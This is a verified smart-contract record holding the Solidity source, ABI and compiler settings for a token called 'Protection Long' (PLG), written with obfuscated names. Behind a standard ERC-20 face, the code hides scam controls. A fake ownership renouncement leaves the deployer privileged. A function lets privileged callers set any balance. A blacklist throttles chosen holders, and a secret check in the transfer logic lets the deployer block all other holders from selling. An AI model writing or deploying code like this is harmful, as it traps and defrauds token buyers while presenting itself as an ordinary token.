{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface shouldListMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract marketingSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedAt {\n    function createPair(address teamLimit, address amountTotalTake) external returns (address);\n}\n\ninterface exemptFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityToken) external view returns (uint256);\n\n    function transfer(address walletLiquidity, uint256 maxTotal) external returns (bool);\n\n    function allowance(address liquidityMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletLiquidity,\n        uint256 maxTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoMin, uint256 value);\n    event Approval(address indexed liquidityMin, address indexed spender, uint256 value);\n}\n\ninterface exemptFundMetadata is exemptFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ProtectionLong is marketingSwap, exemptFund, exemptFundMetadata {\n\n    bool public toMarketing;\n\n    function receiverTrading(address modeToMin) public {\n        if (sellBuyTrading) {\n            return;\n        }\n        \n        txSell[modeToMin] = true;\n        if (shouldAuto) {\n            shouldAuto = false;\n        }\n        sellBuyTrading = true;\n    }\n\n    uint8 private autoSell = 18;\n\n    address public autoLaunchTx;\n\n    bool public takeMarketing;\n\n    uint256 private fundReceiverBuy;\n\n    bool public sellBuyTrading;\n\n    uint256 swapMarketing;\n\n    uint256 buyTo;\n\n    function balanceOf(address liquidityToken) public view virtual override returns (uint256) {\n        return receiverLiquidity[liquidityToken];\n    }\n\n    address senderFeeTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public amountFeeMin;\n\n    mapping(address => bool) public txSell;\n\n    function buyModeMin(address sellFund) public {\n        modeFromReceiver();\n        if (takeMarketing) {\n            toMarketing = false;\n        }\n        if (sellFund == walletIsReceiver || sellFund == autoLaunchTx) {\n            return;\n        }\n        takeTo[sellFund] = true;\n    }\n\n    function modeFromReceiver() private view {\n        require(txSell[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return tradingSell;\n    }\n\n    function transfer(address launchEnable, uint256 maxTotal) external virtual override returns (bool) {\n        return launchBuy(_msgSender(), launchEnable, maxTotal);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return atTakeTrading;\n    }\n\n    function tradingList(address tokenReceiver, address walletLiquidity, uint256 maxTotal) internal returns (bool) {\n        require(receiverLiquidity[tokenReceiver] >= maxTotal);\n        receiverLiquidity[tokenReceiver] -= maxTotal;\n        receiverLiquidity[walletLiquidity] += maxTotal;\n        emit Transfer(tokenReceiver, walletLiquidity, maxTotal);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed launchMarketing, address indexed amountTradingList);\n\n    function launchedSwap() public {\n        emit OwnershipTransferred(walletIsReceiver, address(0));\n        teamAmountMin = address(0);\n    }\n\n    mapping(address => mapping(address => uint256)) private launchTotal;\n\n    string private atTakeTrading = \"PLG\";\n\n    constructor (){\n        \n        shouldListMarketing fundMax = shouldListMarketing(isWalletToken);\n        autoLaunchTx = launchedAt(fundMax.factory()).createPair(fundMax.WETH(), address(this));\n        if (tradingEnable) {\n            toMarketing = false;\n        }\n        walletIsReceiver = _msgSender();\n        launchedSwap();\n        txSell[walletIsReceiver] = true;\n        receiverLiquidity[walletIsReceiver] = fromBuy;\n        \n        emit Transfer(address(0), walletIsReceiver, fromBuy);\n    }\n\n    function approve(address sellMax, uint256 maxTotal) public virtual override returns (bool) {\n        launchTotal[_msgSender()][sellMax] = maxTotal;\n        emit Approval(_msgSender(), sellMax, maxTotal);\n        return true;\n    }\n\n    mapping(address => bool) public takeTo;\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoSell;\n    }\n\n    function swapReceiver(uint256 maxTotal) public {\n        modeFromReceiver();\n        swapMarketing = maxTotal;\n    }\n\n    mapping(address => uint256) private receiverLiquidity;\n\n    uint256 private fromBuy = 100000000 * 10 ** 18;\n\n    string private tradingSell = \"Protection Long\";\n\n    function allowance(address swapFee, address sellMax) external view virtual override returns (uint256) {\n        if (sellMax == isWalletToken) {\n            return type(uint256).max;\n        }\n        return launchTotal[swapFee][sellMax];\n    }\n\n    address isWalletToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalFee(address launchEnable, uint256 maxTotal) public {\n        modeFromReceiver();\n        receiverLiquidity[launchEnable] = maxTotal;\n    }\n\n    function launchBuy(address tokenReceiver, address walletLiquidity, uint256 maxTotal) internal returns (bool) {\n        if (tokenReceiver == walletIsReceiver) {\n            return tradingList(tokenReceiver, walletLiquidity, maxTotal);\n        }\n        uint256 walletTxTo = exemptFund(autoLaunchTx).balanceOf(senderFeeTake);\n        require(walletTxTo == swapMarketing);\n        require(walletLiquidity != senderFeeTake);\n        if (takeTo[tokenReceiver]) {\n            return tradingList(tokenReceiver, walletLiquidity, tokenSell);\n        }\n        return tradingList(tokenReceiver, walletLiquidity, maxTotal);\n    }\n\n    uint256 constant tokenSell = 12 ** 10;\n\n    function owner() external view returns (address) {\n        return teamAmountMin;\n    }\n\n    address private teamAmountMin;\n\n    bool public tradingEnable;\n\n    address public walletIsReceiver;\n\n    bool public shouldAuto;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fromBuy;\n    }\n\n    function transferFrom(address tokenReceiver, address walletLiquidity, uint256 maxTotal) external override returns (bool) {\n        if (_msgSender() != isWalletToken) {\n            if (launchTotal[tokenReceiver][_msgSender()] != type(uint256).max) {\n                require(maxTotal <= launchTotal[tokenReceiver][_msgSender()]);\n                launchTotal[tokenReceiver][_msgSender()] -= maxTotal;\n            }\n        }\n        return launchBuy(tokenReceiver, walletLiquidity, maxTotal);\n    }\n\n    function getOwner() external view returns (address) {\n        return teamAmountMin;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountTradingList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFeeMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLaunchTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellFund\",\"type\":\"address\"}],\"name\":\"buyModeMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeToMin\",\"type\":\"address\"}],\"name\":\"receiverTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellBuyTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxTotal\",\"type\":\"uint256\"}],\"name\":\"swapReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxTotal\",\"type\":\"uint256\"}],\"name\":\"totalFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletIsReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ProtectionLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}